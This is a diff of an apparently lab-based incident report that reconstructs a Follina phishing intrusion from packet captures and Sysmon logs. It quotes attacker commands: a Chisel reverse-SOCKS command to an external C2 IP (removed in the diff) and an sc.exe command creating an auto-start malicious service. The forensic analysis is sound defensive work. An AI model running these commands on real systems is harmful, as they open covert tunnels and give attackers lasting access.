@@ -5,157 +5,185 @@ The attacker gained access through a **malicious document**, established **comma
 
 ---
 
-# Incident Overview
+# Evidence Integrity Verification
 
-Attack Chain:
+Before beginning analysis, the integrity of the provided evidence files was verified using SHA256 hashing.
 
-1. Phishing document downloaded
-2. Word document executes exploit
-3. Payload downloaded from attacker infrastructure
-4. Command & Control communication established
-5. Reverse proxy established
-6. Privilege escalation via PrintSpoofer
-7. New administrator account created
-8. Persistence established via Windows service
+Evidence:
+
+* [PCAP SHA256 Hash](Screenshots/01_pcap_sha256_hash.png)
+* [Sysmon Log SHA256](Screenshots/02_sysmon_evtx_sha256_hash.png)
+* [Windows Event Log SHA256](Screenshots/03_windows_evtx_sha256_hash.png)
 
 ---
 
 # Initial Access – Malicious Document
 
-The victim downloaded a malicious Word document from the phishing server.
+The victim downloaded a malicious Word document from a phishing server.
 
-![Malicious Document Download](Screenshots/10_http_traffic_phishteam_xyz.png)
+Evidence:
 
-The file retrieved:
-
-```
-free_magicules.doc
-```
-
-Host involved:
-
-```
-phishteam.xyz
-```
+* [Malicious Document Download](Screenshots/04_malicious_document_free_magicules_doc.png)
+* [Infected User Account](Screenshots/05_infected_user_benimaru.png)
+* [WinWord Execution Event](Screenshots/06_winword_process_execution.png)
 
 ---
 
-# Exploit Execution
+# Command and Control Infrastructure
 
-The malicious document triggered execution of:
+Network traffic analysis revealed communication with attacker infrastructure.
 
-```
-msdt.exe
-```
+Evidence:
 
-This is associated with the **Follina vulnerability**.
+* [C2 IP Address Identified](Screenshots/07_c2_ip_address_167.71.199.191.png)
+* [Encoded Base64 Payload](Screenshots/08_base64_encoded_payload.png)
 
-![MSDT Execution](Screenshots/09_msdt_follina_exploit.png)
+The attack leveraged the **Follina vulnerability (CVE-2022-30190)**.
 
----
+Evidence:
 
-# Payload Download
-
-The exploit downloaded a second stage payload using PowerShell.
-
-![Payload Download](Screenshots/09_certutil_download_first_exe.png)
-
-Payload retrieved:
-
-```
-first.exe
-```
+* [MSDT Follina Exploit Execution](Screenshots/09_msdt_follina_exploit.png)
 
 ---
 
-# Command and Control
+# Payload Delivery
 
-Network analysis revealed outbound traffic to:
+Persistence artifacts were discovered within the Startup folder.
 
-```
-167.71.199.191
-```
+Evidence:
 
-![C2 Traffic](Screenshots/06_c2_ip_167.71.199.191.png)
+* [Startup Folder Persistence Artifact](Screenshots/10_startup_folder_persistence_update.zip.png)
+
+The malware payload was downloaded using PowerShell and `certutil`.
+
+Evidence:
+
+* [PowerShell Certutil Payload Download](Screenshots/11_powershell_certutil_payload_download.png)
+* [Payload SHA256 Hash](Screenshots/12_first_exe_sha256_hash.png)
+* [Payload Execution Sysmon Event](Screenshots/13_first_exe_execution_sysmon_event.png)
 
 ---
 
-# Reverse Proxy Tool
+# Network Traffic Analysis
 
-The attacker executed **Chisel**, a tool used to create a reverse SOCKS proxy.
+Wireshark analysis identified HTTP requests to malicious infrastructure.
 
-![Chisel Command](Screenshots/20_chisel_reverse_socks_command.png)
+Evidence:
 
-Command executed:
+* [Wireshark HTTP Traffic Filter](Screenshots/14_wireshark_http_filter.png)
+* [Phishing Server Index Request](Screenshots/15_phishteam_index_request.png)
+* [TCP Stream HTTP Traffic](Screenshots/16_tcp_stream_http_traffic.png)
+* [Wireshark HTTP Request Filter](Screenshots/17_wireshark_http_request_filter.png)
+* [User Agent Investigation](Screenshots/18_wireshark_http_user_agent_filter.png)
 
-```
-ch.exe client 167.71.199.191:8080 R:socks
-```
+Additional command and control communication was discovered.
+
+Evidence:
+
+* [ResolveCyber C2 Request](Screenshots/19_resolvecyber_http_request.png)
+
+---
+
+# Internal Reconnaissance
+
+The attacker enumerated network services using system tools.
+
+Evidence:
+
+* [Netstat Listening Ports](Screenshots/20_netstat_listening_ports.png)
+* [WinRM Port 5985 Listening](Screenshots/21_winrm_port_5985_listening.png)
+
+---
+
+# Reverse Proxy Setup
+
+The attacker deployed **Chisel**, a reverse SOCKS proxy tool.
+
+Evidence:
+
+* [Chisel Reverse SOCKS Command](Screenshots/22_chisel_reverse_socks_command.png)
+* [Chisel Binary SHA256 Hash](Screenshots/23_chisel_sha256_hash.png)
+* [Chisel VirusTotal Detection](Screenshots/24_chisel_virustotal_detection.png)
+
+WinRM was used as part of remote administration.
+
+Evidence:
+
+* [WinRM Port Explanation](Screenshots/25_winrm_port_5985_description.png)
 
 ---
 
 # Privilege Escalation
 
-Privilege escalation was performed using **PrintSpoofer**, exploiting the `SeImpersonatePrivilege`.
+Privilege escalation was achieved using **PrintSpoofer**.
 
-![PrintSpoofer Execution](Screenshots/25_printspoofer_sha256_hash.png)
+Evidence:
+
+* [Exploit Binary Sysmon Event](Screenshots/26_spf_exploit_binary_sysmon_event.png)
+* [PrintSpoofer SHA256 Hash](Screenshots/27_printspoofer_sha256_hash.png)
+* [PrintSpoofer VirusTotal Detection](Screenshots/28_printspoofer_virustotal_detection.png)
+* [PrintSpoofer Exploit Documentation](Screenshots/29_printspoofer_exploit_reference.png)
+
+---
+
+# Additional Payload Delivery
+
+Further executable downloads were identified within network traffic.
+
+Evidence:
+
+* [Executable Download Filter](Screenshots/30_wireshark_exe_download_filter.png)
 
 ---
 
 # Account Creation
 
-The attacker created a new user account:
+The attacker created a new user account.
 
-```
-shion
-```
+Evidence:
 
-![Account Creation](Screenshots/28_new_user_account_creation.png)
+* [New User Account Creation](Screenshots/31_new_user_account_creation_sysmon.png)
 
-Windows Event ID confirming creation:
+The attacker then added the account to the **Administrators group**.
 
-```
-4720
-```
+Evidence:
+
+* [Localgroup Administrator Command](Screenshots/32_net_localgroup_administrators_add_shion.png)
+
+Windows security logs confirmed the account creation event.
+
+Evidence:
+
+* [Event ID 4720 Lookup](Screenshots/33_eventid_4720_account_creation_lookup.png)
 
 ---
 
 # Privilege Assignment
 
-The attacker added the account to the **Administrators group**.
+The attacker successfully added the user to the administrators group.
 
-![Admin Group Addition](Screenshots/29_admin_group_addition.png)
+Evidence:
+
+* [Administrator Group Addition](Screenshots/34_admin_group_addition.png)
+* [Event ID 4732 Lookup](Screenshots/35_windows_eventid_4732_lookup.png)
 
 ---
 
 # Persistence
 
-Persistence was established by creating a Windows service.
+Persistence was established by creating a malicious Windows service.
 
-![Service Persistence](Screenshots/30_persistence_service_creation.png)
+Evidence:
 
-Command executed:
+* [SC Service Creation Persistence](Screenshots/36_sc_service_creation_persistence.png)
+
+The command executed:
 
 ```
 sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
 ```
 
-This ensures the malware runs **every time the system boots**.
-
----
-
-# MITRE ATT&CK Techniques
-
-| Technique | Description                     |
-| --------- | ------------------------------- |
-| T1566     | Phishing                        |
-| T1204     | User Execution                  |
-| T1059     | Command Execution               |
-| T1105     | Ingress Tool Transfer           |
-| T1572     | Protocol Tunneling              |
-| T1134     | Access Token Manipulation       |
-| T1543     | Create or Modify System Process |
-| T1078     | Valid Accounts                  |
+This ensures the malware executes automatically when the system boots.
 
 ---
 
@@ -165,11 +193,14 @@ The attacker successfully:
 
 * Delivered a malicious document
 * Exploited the Follina vulnerability
-* Downloaded malware payloads
-* Established command and control
+* Downloaded and executed malware payloads
+* Established command and control communication
+* Deployed a reverse SOCKS proxy
 * Escalated privileges using PrintSpoofer
-* Created an administrator account
+* Created a privileged user account
+* Added the user to the Administrators group
 * Installed persistence via a Windows service
 
-This investigation demonstrates the workflow used by SOC analysts to identify attacker activity across **network traffic, endpoint logs, and system artifacts**.
+This investigation demonstrates the workflow used by **SOC analysts and incident responders** to reconstruct attacker activity across network traffic, endpoint logs, and system artifacts.
+
 
